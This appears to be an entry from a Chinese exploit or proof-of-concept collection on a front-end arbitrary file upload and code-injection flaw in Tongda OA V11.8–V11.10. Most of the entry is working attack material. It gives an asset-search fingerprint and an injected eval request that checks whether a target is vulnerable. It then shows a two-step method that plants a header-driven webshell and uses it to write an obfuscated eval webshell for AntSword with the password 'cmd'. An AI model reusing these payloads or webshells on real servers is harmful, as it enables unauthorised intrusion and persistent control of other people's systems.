# 通达OAgateway存在前台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage HTTP/1.1`

**请求体 / payload**
```
当回显中存在`vuln_test`字段表示存在该漏洞
Host: 192.168.31.164

使用蚁剑进行连接，密码为`cmd`\

利用方式2:写入webshell
1. 由于无法直接写入带有变量的 php 文件，所以首先利用无参 webshell
GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite(fopen(%222.php%22,%22w+%22),%22%3C?php%20eval(next(getallheaders()));%22))%3b/*&id=266&module=Carouselimage HTTP/1.1
Host: 192.168.31.164
2. 利用无参webshell写入webshell
GET /general/appbuilder/web/2.php HTTP/1.1
Host: 192.168.31.164
Cookie: file_put_contents("test1.php","<?php class G948nsWJ { public function __construct(\$HvOQv){ @eval(\"/*Zrm5oN973g*/\".\$HvOQv.\"/*Zrm5oN973g*/\"); }}new …（脚本共 950 字，完整版见原文）
```

**其他**
- 通达OA gateway存在前台任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA V11.8-通达OA V11.10